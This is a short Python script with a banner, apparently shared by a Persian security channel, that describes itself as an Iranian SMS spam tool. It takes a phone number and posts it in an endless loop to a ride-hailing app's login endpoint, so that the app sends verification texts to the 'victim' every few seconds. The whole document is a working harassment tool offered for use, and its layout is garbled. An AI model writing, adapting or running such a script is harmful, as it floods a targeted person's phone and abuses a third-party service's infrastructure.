print(""" ___ ___ ___ ___ _ ___
 __ _ ___ (_-</ _ \/ _ `/ ' \ (_
-</ ' \(_-</___/ .__/\_,_/_/_/_/
 /___/_/_/_/___/ /_/ # Sms Spam Iran #C
reator : Milad RanjbarWebSite : CyberAm

ooz.ComTelegram : t.me/CyberAmoozI
nstagram : instagram.com/CyberAmoo
z.......................
.............""") 
import requests
import time 
try: print("Note : For Exit Tools ==> Ctrl + C \n") 
NumberPhone = input("Enter Number Phone (ex: 9170000000) = ")
 if NumberPhone == "" : print("\n[!] Please Enter Phone Number") 
else : url = "https://app.snapp.taxi/login/?redirect_to=%2F" 
data = {"cellphone":"+98" + NumberPhone}
 while True: requests.post(url,data=data)
 print("[+] Send SMS For Victim") 
time.sleep(4)except: print("\n[-] You Exit Tools !!")
